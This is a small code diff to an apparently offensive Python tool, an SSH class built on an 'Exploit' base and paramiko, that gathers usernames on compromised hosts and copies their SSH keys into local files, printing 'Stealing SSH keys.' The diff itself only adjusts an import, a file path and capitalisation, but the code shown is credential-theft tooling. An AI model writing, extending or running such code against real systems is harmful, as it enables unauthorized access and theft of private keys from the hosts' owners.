@@ -1,4 +1,5 @@
 from hydra import Exploit
+from util import Color
 import sys, paramiko
 
 class SSH(Exploit):
@@ -30,7 +31,7 @@ class SSH(Exploit):
         else:
             keys_bytes = stdout.read()
             keys = keys_bytes.decode(encoding='UTF-8')
-            with open(f"../data/{ip_address}_{username}_sshkey.txt", "w") as text_file:
+            with open(f"./data/{ip_address}_{username}_sshkey.txt", "w") as text_file:
                 text_file.write(keys)
         finally:
             stdin.close()
@@ -50,6 +51,6 @@ class SSH(Exploit):
                 print('Success. Gathering all usernames.')
                 usernames = self.get_usernames(ssh)
                 
-                print('Stealing ssh keys.')
+                print('Stealing SSH keys.')
                 self.get_sshkeys(ssh, ip_address, c[0])
                 return usernames
